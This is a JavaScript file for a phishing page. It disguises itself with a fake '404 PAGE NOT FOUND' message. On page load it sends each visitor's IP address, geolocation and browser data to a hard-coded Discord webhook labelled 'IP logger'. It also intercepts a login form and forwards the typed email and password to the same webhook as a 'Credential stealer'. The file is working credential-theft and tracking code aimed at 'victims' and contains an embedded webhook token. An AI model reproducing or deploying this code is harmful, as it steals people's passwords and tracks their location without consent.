console.log('404 PAGE NOT FOUND ERROR')




const webhookurl = 'https://discord.com/api/webhooks/1180471242411749438/BtvRD17XnxyNchuBW4E2T4utTRNFtpscAkcTR2BfUjaLMc2N1OWX4N0hGHa3UH49EV4I'

// Sets current time to a variable

const currentDate = new Date()

const hours = currentDate.getHours();
const minutes = currentDate.getMinutes();
const seconds = currentDate.getSeconds();

const currentTime = `${hours}:${minutes}:${seconds}`;


// Fetches the ip data


fetch('https://api.ipify.org?format=json')
  .then(response => response.json())
  .then(data => {
    const ip = data.ip;

    // gets the browsers user agent

    const browserdata = navigator.userAgent;

    // Gets the ip info

    fetch('https://ipapi.co/' + ip + '/json/')
      .then(response => response.json())
      .then(ip_info => {
       
        // Sets the data to be posted to the webhook

        const postData = {
          embeds: [{
            title: 'IP logger',
            description: 'Your victim clicked the link at | ' + currentTime,
            color: 16763904,
            fields: [
              {
                name: 'Ip address',
                value: '```' + ip + '```',
                inline: false
              },
              {
                name: 'User agent data',
                value: '```' + browserdata + '```',
                inline: false
              },
              {
                name: 'IP info',
                value: '```' + 'Ip: ' + ip_info.ip + '\n' + 'City: ' + ip_info.city + '\n' + 'Region: ' + ip_info.region + '|' + ip_info.region_code + '\n' + 'Country: ' + ip_info.country_name + '\n' + 'Lat + Long: ' + ip_info.latitude + ip_info.longitude + '\n' + 'Postal: ' + ip_info.postal + '\n' + 'Timezone: ' + ip_info.timezone + '\n' + 'Organization: ' + ip_info.org + '```',
                inline: false
              },
            ]
          }]
        };


        // Posts the data

        fetch(webhookurl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(postData)
        });
      })
  })


  document.getElementById('userInputForm').addEventListener('submit', function(event) {
    event.preventDefault(); 

    const useremail = document.getElementById('useremail').value;
    const userpassword  = document.getElementById('userpassword').value;

    userinput_data = {
        embeds: [{
            title: 'Credential stealer',
            description: 'Your victim input info at | ' + currentTime,
            color: 16763904,
            fields: [
                {
                    name: 'Info',
                    value: '```' + 'User email: ' + useremail + '\n' + 'User password: ' + userpassword + '```',
                    inline: false
                }
            ]
        }]

    }


    this.reset();

    console.log('User Input:', useremail);

    fetch(webhookurl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(userinput_data)
    })
});



